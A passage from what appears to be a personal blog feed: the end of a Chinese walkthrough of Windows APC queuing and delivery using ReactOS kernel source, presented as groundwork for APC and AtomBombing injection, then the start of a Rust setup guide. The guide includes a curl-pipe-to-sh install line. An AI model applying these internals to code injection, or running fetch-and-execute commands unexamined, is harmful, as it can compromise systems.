Status, PriorityBoost);//唤醒线程</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>先不管Apc是怎么得到执行的，来看看KAPC_STATE</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _KAPC_STATE</div><div class="line">&#123;</div><div class="line">    LIST_ENTRY ApcListHead[2];//UserMode/KernelMode的两个链表</div><div class="line">    struct _KPROCESS *Process;</div><div class="line">    BOOLEAN KernelApcInProgress;</div><div class="line">    BOOLEAN KernelApcPending; //等待执行</div><div class="line">    BOOLEAN UserApcPending; //等待执行</div><div class="line">&#125; KAPC_STATE, *PKAPC_STATE, *RESTRICTED_POINTER PRKAPC_STATE;</div></pre></td></tr></table></figure> <p>其中ApcListHead保存了线程的两个Apc链表，分别对应UserMode和KernelMode。</p> <p>Thread-&gt;ApcState表示当前需要执行的ApcState，可能是挂靠进程的</p> <p>Thread-&gt;SavedApcState表示挂靠后保存的当前线程的ApcState，</p> <p>KTHREAD的ApcStatePointer[2]字段保存了两个ApcState的指针</p> <p>具体看下面的代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">KeAttachProcess-&gt;</div><div class="line">VOID</div><div class="line">NTAPI</div><div class="line">KiAttachProcess(IN PKTHREAD Thread,</div><div class="line">                IN PKPROCESS Process,</div><div class="line">                IN PKLOCK_QUEUE_HANDLE ApcLock,</div><div class="line">                IN PRKAPC_STATE SavedApcState //&amp;Thread-&gt;SavedApcThread</div><div class="line">                )</div><div class="line">&#123;</div><div class="line">/* Swap the APC Environment */</div><div class="line">    KiMoveApcState(&amp;Thread-&gt;ApcState, SavedApcState); //把当前ApcState保存到SavedApcState</div><div class="line"></div><div class="line">    /* Reinitialize Apc State */</div><div class="line">    InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]);</div><div class="line">    InitializeListHead(&amp;Thread-&gt;ApcState.ApcListHead[UserMode]);</div><div class="line">    Thread-&gt;ApcState.Process = Process;</div><div class="line">    Thread-&gt;ApcState.KernelApcInProgress = FALSE;</div><div class="line">    Thread-&gt;ApcState.KernelApcPending = FALSE;</div><div class="line">    Thread-&gt;ApcState.UserApcPending = FALSE;</div><div class="line"></div><div class="line">    /* Update Environment Pointers if needed*/</div><div class="line">    if (SavedApcState == &amp;Thread-&gt;SavedApcState)</div><div class="line">    &#123;</div><div class="line">        Thread-&gt;ApcStatePointer[OriginalApcEnvironment] = &amp;Thread-&gt;</div><div class="line">                                                          SavedApcState;//</div><div class="line">        Thread-&gt;ApcStatePointer[AttachedApcEnvironment] = &amp;Thread-&gt;ApcState;</div><div class="line">        Thread-&gt;ApcStateIndex = AttachedApcEnvironment; //index变成了AttachedApcEnvironment</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>来一个结构图</p> <p><img src="/img/apc.png" alt="img"></p> <h1 id="上菜吃饭"><a href="#上菜吃饭" class="headerlink" title="上菜吃饭"></a>上菜吃饭</h1><p>Apc已经点了，什么时候才能端上来呢？我们接着看…</p> <h2 id="Apc投递"><a href="#Apc投递" class="headerlink" title="Apc投递"></a>Apc投递</h2><blockquote> <p>线程wait、线程切换到应用层、线程被挂起等，一旦线程有空隙了，windows就会把apc队列顺便执行一遍</p> </blockquote> <p>搜索<code>NormalRoutine</code>和<code>KernelRoutine</code>字段，找到<code>KiDeliverApc</code>，这个函数是具体分发Apc的函数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">NTAPI</div><div class="line">KiDeliverApc(IN KPROCESSOR_MODE DeliveryMode,</div><div class="line">             IN PKEXCEPTION_FRAME ExceptionFrame,</div><div class="line">             IN PKTRAP_FRAME TrapFrame)</div><div class="line">             </div><div class="line"> * @remarks First, Special APCs are delivered, followed by Kernel-Mode APCs and</div><div class="line"> *          User-Mode APCs. Note that the TrapFrame is only valid if the</div><div class="line"> *          delivery mode is User-Mode.</div><div class="line"> *          Upon entry, this routine executes at APC_LEVEL.</div></pre></td></tr></table></figure> <p>那在哪里调用的KiDeliverApc的呢，找到多处</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//hal\halx86\generic\irq.S</div><div class="line">.globl _HalpApcInterrupt2ndEntry</div><div class="line">.func HalpApcInterrupt2ndEntry]</div><div class="line"></div><div class="line">//hal\halx86\generic\irql.c</div><div class="line">VOID HalpLowerIrql(KIRQL NewIrql)；</div><div class="line"></div><div class="line">//暂时忽略上面两个了</div><div class="line"></div><div class="line">//ke\i386\trap.s</div><div class="line">.func KiServiceExit</div><div class="line">_KiServiceExit:</div><div class="line">    /* Disable interrupts */</div><div class="line">    cli</div><div class="line"></div><div class="line">    /* Check for, and deliver, User-Mode APCs if needed */</div><div class="line">    CHECK_FOR_APC_DELIVER 1 //</div><div class="line"></div><div class="line">    /* Exit and cleanup */</div><div class="line">    TRAP_EPILOG FromSystemCall, DoRestorePreviousMode, DoNotRestoreSegments, DoNotRestoreVolatiles, DoRestoreEverything</div><div class="line">.endfunc</div></pre></td></tr></table></figure> <blockquote> <p>根据《windows内核情景分析》介绍, 执行用户APC的时机在从内核返回用户空间的途中（可能是系统调用、中断、异常处理之后需要返回用户空间）</p> </blockquote> <p>也就是肯定会经过<code>_KiServiceExit</code>，那就跟着来看看吧。</p> <ol> <li><code>CHECK_FOR_APC_DELIVER</code>宏 检查是不是需要投递Apc，具体检查trapframe是不是指向返回用户模式的，是则继续检查用户模式Apc是否需要投递。<br>参数：<code>ebp = PKTRAP_FRAME</code>，PreserveEax</li> </ol> <ul> <li>trap_frame.Eflags == EFLAGS_V86_MASK，运行在V86模式，不检查是否是用户模式的trap_frame</li> <li>trap_frame.Segcs != 1（KernelMode），表示是用户模式</li> <li>kthread = PCR[KPCR_CURRENT_THREAD]，kthread.alerted = 0，置为不可唤醒</li> <li>kthread-&gt;ApcState.UserApcPending 是FALSE，啥也不做，TRUE才进行投递</li> <li>如果PreserveEax=1，保存eax，保存一些IRQL提升会清除的信息到trap_frame，fs，ds，es，gs</li> <li>提示irql到APC_LEVEL</li> <li>调用KiDeliverApc(UserMode, 0, trap_frame);</li> <li>恢复irql</li> <li>如果PreserveEax=1，恢复eax</li> </ul> <ol> <li><code>TRAP_EPILOG</code>是自陷处理，参数：<code>ebp = PKTRAP_FRAME</code><blockquote> <p>// This macro creates an epilogue for leaving any system trap.<br>// It is used for exiting system calls, exceptions, interrupts and generic<br>// traps.</p> </blockquote> </li> </ol> <ul> <li>通过TrapFrame恢复一堆寄存器、堆栈信息，然后sysexit回到用户态空间</li> </ul> <p>继续看一下调用<code>KiDeliverApc</code>内部究竟是怎么处理的</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line">KiDeliverApc(IN KPROCESSOR_MODE DeliveryMode,</div><div class="line">             IN PKEXCEPTION_FRAME ExceptionFrame,</div><div class="line">             IN PKTRAP_FRAME TrapFrame) //系统空间堆栈的“自陷框架”</div><div class="line">&#123;</div><div class="line">//1. 保存原来的trap_frame</div><div class="line">OldTrapFrame = Thread-&gt;TrapFrame;</div><div class="line">Thread-&gt;TrapFrame = TrapFrame;</div><div class="line"></div><div class="line">/* Clear Kernel APC Pending */</div><div class="line">Thread-&gt;ApcState.KernelApcPending = FALSE;</div><div class="line">/* Check if Special APCs are disabled */</div><div class="line">if (Thread-&gt;SpecialApcDisable) goto Quickie;</div><div class="line"></div><div class="line">//2. 先投递内核Apc，循环投递队列中所有的内核apc，不涉及切换到用户空间</div><div class="line">while (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[KernelMode]))</div><div class="line">&#123;</div><div class="line">    //Thread-&gt;ApcQueueLock加锁访问</div><div class="line">    //取出一个Apc</div><div class="line">    ApcListEntry = Thread-&gt;ApcState.ApcListHead[KernelMode].Flink;</div><div class="line">    Apc = CONTAINING_RECORD(ApcListEntry, KAPC, ApcListEntry);</div><div class="line">    NormalRoutine = Apc-&gt;NormalRoutine;</div><div class="line">    KernelRoutine = Apc-&gt;KernelRoutine;</div><div class="line">    NormalContext = Apc-&gt;NormalContext;</div><div class="line">    SystemArgument1 = Apc-&gt;SystemArgument1;</div><div class="line">    SystemArgument2 = Apc-&gt;SystemArgument2;</div><div class="line">    </div><div class="line">    //特殊Apc，特指内核Apc，但是Apc的NormalRoutine是空的</div><div class="line">    if (!NormalRoutine) &#123;</div><div class="line">        //将Apc出队列，然通过KernelRoutine调用内核Apc响应函数</div><div class="line">        KernelRoutine(Apc,</div><div class="line">                          &amp;NormalRoutine,</div><div class="line">                          &amp;NormalContext,</div><div class="line">                          &amp;SystemArgument1,</div><div class="line">                          &amp;SystemArgument2);</div><div class="line">    &#125; else &#123;</div><div class="line">        //普通的内核Apc</div><div class="line">        if ((Thread-&gt;ApcState.KernelApcInProgress) ||</div><div class="line">                (Thread-&gt;KernelApcDisable))</div><div class="line">            &#123; //退出，必须安全才会投递</div><div class="line">            &#125;</div><div class="line">        ////将Apc出队列，然通过KernelRoutine调用内核Apc响应函数</div><div class="line">        KernelRoutine(Apc,</div><div class="line">                          &amp;NormalRoutine, //内部可能修改NormalRoutine</div><div class="line">                          &amp;NormalContext,</div><div class="line">                          &amp;SystemArgument1,</div><div class="line">                          &amp;SystemArgument2);</div><div class="line">        </div><div class="line">        //如果NormalRoutine依然不为空，在调用NormalRoutine</div><div class="line">        if (NormalRoutine)</div><div class="line">        &#123;</div><div class="line">            /* At Passive Level, an APC can be prempted by a Special APC */</div><div class="line">            Thread-&gt;ApcState.KernelApcInProgress = TRUE;</div><div class="line">            KeLowerIrql(PASSIVE_LEVEL); //将到PASSIVE_LEVEL执行</div><div class="line"></div><div class="line">            /* Call and Raise IRQ back to APC_LEVEL */</div><div class="line">            NormalRoutine(NormalContext, SystemArgument1, SystemArgument2);</div><div class="line">            KeRaiseIrql(APC_LEVEL, &amp;ApcLock.OldIrql);</div><div class="line">        &#125;</div><div class="line">        Thread-&gt;ApcState.KernelApcInProgress = FALSE;</div><div class="line">        //继续循环</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//3. 投递完内核apc，如果KiDeliverApc目标是用户apc，那么继续投递用户apc</div><div class="line">//每次值投递一个User mode Apc</div><div class="line">if ((DeliveryMode == UserMode) &amp;&amp;</div><div class="line">        !(IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])) &amp;&amp;</div><div class="line">         (Thread-&gt;ApcState.UserApcPending)) //TRUE  </div><div class="line">&#123;</div><div class="line">    Thread-&gt;ApcState.UserApcPending = FALSE;</div><div class="line">    //取出第一个Apc</div><div class="line">    //先调用他的KernelRoutine</div><div class="line">    KernelRoutine(Apc,</div><div class="line">                  &amp;NormalRoutine,</div><div class="line">                  &amp;NormalContext,</div><div class="line">                  &amp;SystemArgument1,</div><div class="line">                  &amp;SystemArgument2);</div><div class="line">    /* Check if there&apos;s no normal routine */</div><div class="line">    if (!NormalRoutine)</div><div class="line">    &#123;</div><div class="line">        /* Check if more User APCs are Pending */</div><div class="line">        KeTestAlertThread(UserMode);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        /* Set up the Trap Frame and prepare for Execution in NTDLL.DLL */</div><div class="line">        //不是直接调用NormalRoutine，因为他是用户太的函数，需要切换到用户空间才能执行</div><div class="line">        KiInitializeUserApc(ExceptionFrame,</div><div class="line">                            TrapFrame,</div><div class="line">                            NormalRoutine,</div><div class="line">                            NormalContext,</div><div class="line">                            SystemArgument1,</div><div class="line">                            SystemArgument2);</div><div class="line">    &#125;                  </div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>根据注释应该很清楚deliver的逻辑了，还是在看张图<br><img src="/img/KiDeliverApc.png" alt="img"></p> <p><code>CHECK_FOR_APC_DELIVER</code>用户态Apc的delvier有个重点，Thread-&gt;ApcState.UserApcPending必须是TRUE，那什么时候才会是TRUE，我蛮来看看</p> <ol> <li>在KiInsertQueueApc，如果线程等待，且Alertable是TRUE<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">else if ((Thread-&gt;State == Waiting) &amp;&amp;</div><div class="line">                     (Thread-&gt;WaitMode == UserMode) &amp;&amp;</div><div class="line">                     ((Thread-&gt;Alertable) || //</div><div class="line">                      (Thread-&gt;ApcState.UserApcPending)))</div><div class="line">            &#123;</div><div class="line">                /* Set user-mode APC pending */</div><div class="line">                Thread-&gt;ApcState.UserApcPending = TRUE;</div><div class="line">                Status = STATUS_USER_APC;</div><div class="line">                goto Unwait;</div><div class="line">            &#125;</div><div class="line">```            </div><div class="line">2. KiCheckAlertability中(wrk中是TestForAlertPending)</div></pre></td></tr></table></figure> </li> </ol> <p>FORCEINLINE<br>NTSTATUS<br>KiCheckAlertability(IN PKTHREAD Thread,<br>                    IN BOOLEAN Alertable,<br>                    IN KPROCESSOR_MODE WaitMode)<br>{<br>    /<em> Check if the wait is alertable </em>/<br>    if (Alertable)<br>    {<br>        /<em> It is, first check if the thread is alerted in this mode </em>/<br>        if (Thread-&gt;Alerted[WaitMode])<br>        {<br>            /<em> It is, so bail out of the wait </em>/<br>            Thread-&gt;Alerted[WaitMode] = FALSE;<br>            return STATUS_ALERTED;<br>        }<br>        else if ((WaitMode != KernelMode) &amp;&amp;<br>                (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])))<br>        {<br>            /<em> It’s isn’t, but this is a user wait with queued user APCs </em>/<br>            Thread-&gt;ApcState.UserApcPending = TRUE;<br>            return STATUS_USER_APC;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">两种情况都需要Alertable = TRUE，这个字段表示线程是唤醒的，也就是说只有可唤醒的线程，才能拿投递他的用态APC，否则不会</div><div class="line"></div><div class="line">&gt; SleepEx, WaitForSingleObject，WaitForMultipleObjects都可以设置线程为Alertable</div><div class="line"></div><div class="line">接着继续看看`KiInitializeUserApc`是怎么切换到用户空间执行的用户态函数</div></pre></td></tr></table></figure></p> <p>VOID<br>NTAPI<br>KiInitializeUserApc(IN PKEXCEPTION_FRAME ExceptionFrame,<br>                    IN PKTRAP_FRAME TrapFrame,<br>                    IN PKNORMAL_ROUTINE NormalRoutine,<br>                    IN PVOID NormalContext,<br>                    IN PVOID SystemArgument1,<br>                    IN PVOID SystemArgument2)<br>{</p> <pre><code>//V86模式下，不投递   /* Save the full context */ Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; KeTrapFrameToContext(TrapFrame, ExceptionFrame, &amp;Context);  //检查不是KernleMode ASSERT((TrapFrame-&gt;SegCs &amp; MODE_MASK) != KernelMode);  ...  /* Get the aligned size */ AlignedEsp = Context.Esp &amp; ~3;//来自于TrapFrame.HardwareEsp或TempEsp //Context和4个参数的长度 ContextLength = CONTEXT_ALIGNED_SIZE + (4 * sizeof(ULONG_PTR)); //将原始堆栈扩展ContextLength，用来保存Context和参数 Stack = ((AlignedEsp - 8) &amp; ~3) - ContextLength;  /* Probe the stack */ ProbeForWrite((PVOID)Stack, AlignedEsp - Stack, 1); ASSERT(!(Stack &amp; 3));  /* Copy data into it */ //(4 * sizeof(ULONG_PTR)))是后面4个参数的位置，然后接着拷贝Context，将老的TrapFrame内容拷贝到用户太堆栈中 RtlCopyMemory((PVOID)(Stack + (4 * sizeof(ULONG_PTR))),               &amp;Context,               sizeof(CONTEXT));  /* Run at APC dispatcher */ TrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //KeUserApcDispatcher保存的其实就是KiUserApcDispatcher，是用户空间函数 TrapFrame-&gt;HardwareEsp = Stack;//栈顶  /* Setup Ring 3 state */ TrapFrame-&gt;SegCs = Ke386SanitizeSeg(KGDT_R3_CODE, UserMode); TrapFrame-&gt;HardwareSegSs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegDs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegEs = Ke386SanitizeSeg(KGDT_R3_DATA, UserMode); TrapFrame-&gt;SegFs = Ke386SanitizeSeg(KGDT_R3_TEB, UserMode); TrapFrame-&gt;SegGs = 0; TrapFrame-&gt;ErrCode = 0;  /* Sanitize EFLAGS */ TrapFrame-&gt;EFlags = Ke386SanitizeFlags(Context.EFlags, UserMode);  /* Check if thread has IOPL and force it enabled if so */ if (KeGetCurrentThread()-&gt;Iopl) TrapFrame-&gt;EFlags |= 0x3000;  /* Setup the stack */ *(PULONG_PTR)(Stack + 0 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalRoutine; *(PULONG_PTR)(Stack + 1 * sizeof(ULONG_PTR)) = (ULONG_PTR)NormalContext; *(PULONG_PTR)(Stack + 2 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument1; *(PULONG_PTR)(Stack + 3 * sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument2; ... </code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">执行流程根据注释应该很清楚了，这里要解释一下TrapFrame。</div><div class="line">&gt; CPU进入啮合之后，内核堆栈就会有个TrapFrame，保存的是用户空间的线程（因进入内核原因不同，可能是自陷、中断、异常框架，都是一样的结构）。CPU返回用户空间时会使用这个TrapFrame，才能正确返回原理啊的断点，并回复寄存器的状态</div><div class="line">&gt; 这里为了让Apc返回到用户空间执行，就会修改这个TrapFrame，原来的TrapFrame就需要保存，这里保存在了用户空间堆栈中（CONTEXT)</div><div class="line">&gt; 执行完Apc函数之后，执行一个NtContinue，将这个CONTEXT作为参数，这样保存的TrapFrame就会还原到原来的状态，然后CPU又能正常回之前的用户空间了。</div><div class="line"></div><div class="line">KiDeliverApc完了之后，回到_KiServiceExit，会使用被修改过的TrapFrame回到用户空间，执行指定的`KiUserApcDispatcher`(ntdll提供)</div></pre></td></tr></table></figure></p> <p>//更具这个执行KiUserApcDispatcher<br>TrapFrame-&gt;Eip = (ULONG)KeUserApcDispatcher; //其实就是KiUserApcDispatcher，是用户空间函数<br>TrapFrame-&gt;HardwareEsp = Stack;//栈顶</p> <p>.func KiUserApcDispatcher@16<br>.globl _KiUserApcDispatcher@16<br>_KiUserApcDispatcher@16:</p> <pre><code>/* Setup SEH stack */ lea eax, [esp+CONTEXT_ALIGNED_SIZE+16];原始堆栈的位置，SEH mov ecx, fs:[TEB_EXCEPTION_LIST] mov edx, offset _KiUserApcExceptionHandler mov [eax], ecx mov [eax+4], edx  /* Enable SEH */ mov fs:[TEB_EXCEPTION_LIST], eax  /* Put the Context in EDI */ pop eax;弹出第一个参数 lea edi, [esp+12];context的位置  /* Call the APC Routine */ call eax //调用IntCallUserApc  /* Restore exception list */ mov ecx, [edi+CONTEXT_ALIGNED_SIZE] mov fs:[TEB_EXCEPTION_LIST], ecx  /* Switch back to the context */ push 1 push edi;Context call _ZwContinue@8 //正常是不会返回的  /* Save callback return value */ mov esi, eax  /* Raise status */ </code></pre><p>StatusRaiseApc:<br>    push esi<br>    call _RtlRaiseStatus@4 //如果ZwContinue失败了，这里处理<br>    jmp StatusRaiseApc<br>    ret 16<br>.endfunc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">`KiUserApcDispatcher`其实挺简单的，通过esp弹出APc函数，然后调用，就进入了IntCallUserApc，</div><div class="line"></div><div class="line">## 恢复TrapFrame</div><div class="line"></div><div class="line">执行完成后，调用_ZwContinue(Context, 1)，回到内核回复之前修改TrapFrame，也会重新检查是否有Apc需要投递，有则继续投递，</div><div class="line">重复上面的步骤，直到没有了则可以回到之前被中断的用户态的断点处。</div></pre></td></tr></table></figure></p> <p>.func NtContinue@8<br>_NtContinue@8:</p> <pre><code>/* NOTE: We -must- be called by Zw* to have the right frame! */ /* Push the stack frame */ push ebp ; 指向本次调用的自陷框架，记为T1  /* Get the current thread and restore its trap frame */ mov ebx, PCR[KPCR_CURRENT_THREAD] mov edx, [ebp+KTRAP_FRAME_EDX] mov [ebx+KTHREAD_TRAP_FRAME], edx;thread-&gt;TrapFrame = edx  /* Set up stack frame */ mov ebp, esp ; ESP指向新的框架（函数调用框架）  /* Save the parameters */ mov eax, [ebp+0] ; 原来的EBP，就是自陷框架指针，就是T1 mov ecx, [ebp+8] ; Context  /* Call KiContinue */ push eax ;TrapFrame push 0 ;ExceptionFrame push ecx ;Context call _KiContinue@12 ; 将Context恢复到T1中  /* Check if we failed (bad context record) */ or eax, eax jnz Error  /* Check if test alert was requested */ cmp dword ptr [ebp+12], 0 je DontTest  /* Test alert for the thread */ mov al, [ebx+KTHREAD_PREVIOUS_MODE] push eax call _KeTestAlertThread@4 ; 检查用户模式APC队列是否为空，不空将UserApcPending置为TRUE </code></pre><p>DontTest:<br>    /<em> Return to previous context </em>/<br>    pop ebp<br>    mov esp, ebp<br>    jmp _KiServiceExit2 ; 本质和_KiServiceExit相同，如果还有用户APC，会继续投递，直到投递完，才会回到用户被中断的点</p> <p>Error:<br>    pop ebp<br>    mov esp, ebp<br>    jmp _KiServiceExit<br>.endfunc</p> <p>```</p> <p>下面将_KiServiceExit到IntCallUserApc的流程总结一下：<br><img src="/img/deliver.png" alt="img"></p> <p>到这里，终于执行到了用户的Apc函数。</p> <h1 id="结账走人"><a href="#结账走人" class="headerlink" title="结账走人"></a>结账走人</h1><p>到这，APC流程基本弄清楚了。</p> <p>下一篇将结合APC机制分析一下最近比较新的AtomBombing注入技术的详细实现和各个细节。</p> <p><strong>参考</strong></p> <ol> <li><a href="">Reactos内核情景源码分析</a></li> <li><a href="http://bbs.pediy.com/thread-209377.htm" target="_blank" rel="external">线程的Alertable与User APC</a></li> </ol> <p>转载请注明出处，博客原文：<a href="http://anhkgg.github.io/win-apc-analyze1/">http://anhkgg.github.io/win-apc-analyze1/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;翻开&quot;&gt;&lt;a href=&quot;#翻开&quot; class=&quot;headerlink&quot; title=&quot;翻开&quot;&gt;&lt;/a&gt;翻开&lt;/h1&gt;&lt;p&gt;翻开小Win的菜单，APC赫然在目…&lt;/p&gt; &lt;p&gt;做工讲究，味道不错，是小Win的热门菜，我们点一来尝尝！&lt;/p&gt; &lt;p&gt;吃了可以做很多事情…&lt;/p&gt; &lt;ul&gt; &lt;li&gt;APC注入&lt;/li&gt; &lt;li&gt;APC注入&lt;/li&gt; &lt;li&gt;APC注入&lt;/li&gt; &lt;li&gt;…&lt;/li&gt; &lt;/ul&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="windows" scheme="https://anhkgg.github.io/tags/windows/"/>            <category term="APC" scheme="https://anhkgg.github.io/tags/APC/"/>        </entry>      <entry>     <title>Rust笔记（一）-- 环境配置</title>     <link href="https://anhkgg.github.io/rust-note-1-config-environment/"/>     <id>https://anhkgg.github.io/rust-note-1-config-environment/</id>     <published>2017-04-25T14:03:33.000Z</published>     <updated>2017-05-01T07:24:48.342Z</updated>          <content type="html"><![CDATA[<h1 id="安装rust"><a href="#安装rust" class="headerlink" title="安装rust"></a>安装rust</h1><p>Rust中文站下载rust<br><a href="https://www.rust-lang.org/zh-CN/install.html" target="_blank" rel="external">https://www.rust-lang.org/zh-CN/install.html</a><br><a href="https://www.rust-lang.org/zh-CN/downloads.html" target="_blank" rel="external">https://www.rust-lang.org/zh-CN/downloads.html</a></p> <p>安装：</p> <ol> <li>Windows平台<br>下载<a href="https://static.rust-lang.org/dist/rust-1.13.0-x86_64-pc-windows-msvc.msi" target="_blank" rel="external">https://static.rust-lang.org/dist/rust-1.13.0-x86_64-pc-windows-msvc.msi</a>，然后双击运行即可，需要选上PATH环境变量配置</li> </ol> <a id="more"></a> <p>其实应该下载这个版本<a href="https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi" target="_blank" rel="external">https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi</a>，后面会说为什么</p> <ol> <li>Linux平台<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//安装</div><div class="line">   $ curl -sf -L https://static.rust-lang.org/rustup.sh | sh</div><div class="line">//卸载</div><div class="line">  $ sudo /usr/local/lib/rustlib/uninstall.sh</div></pre></td></tr></table></figure> </li> </ol> <p>下面命令成功表示安装成功</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c:\&gt; rustc --version</div><div class="line">rustc 1.13.0 (2c6933acc 2016-11-07)</div><div class="line">C:\&gt; cargo --version</div><div class="line">cargo 0.13.0-nightly (eca9e15 2016-11-01)</div></pre></td></tr></table></figure> <h1 id="配置IDE"><a href="#配置IDE" class="headerlink" title="配置IDE"></a>配置IDE</h1><p>这里介绍的是微软的Visual Studio Code编辑器配置Rust的环境。</p> <p>Visual Studio Code支持windows、linux、mac等，所以在不同平台配置rust都是一样的步骤。</p> <p>下载地址： <a href="https://code.visualstudio.com/" target="_blank" rel="external">https://code.visualstudio.com/</a></p> <p>启动visual studio code，ctrl+shift+x切换到插件安装页面，输入rust。</p> <p><img src="/img/rust_note_one_1.png" alt="image"></p> <p>选择安装Rusty Code插件，支持自动完成、跳转到定义、符号等等功能。<br>安装完成后，重新加载即可启用。</p> <p>新建一个rs文件，visual studio code自动识别为rust语言。右下角有个Rust tool missing，点击后会提示插件缺少的库，选择安装即可（需要保证rust环境安装成功）</p> <p><img src="/img/rust_note_one_2.png" alt="image"></p> <p>会出现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div 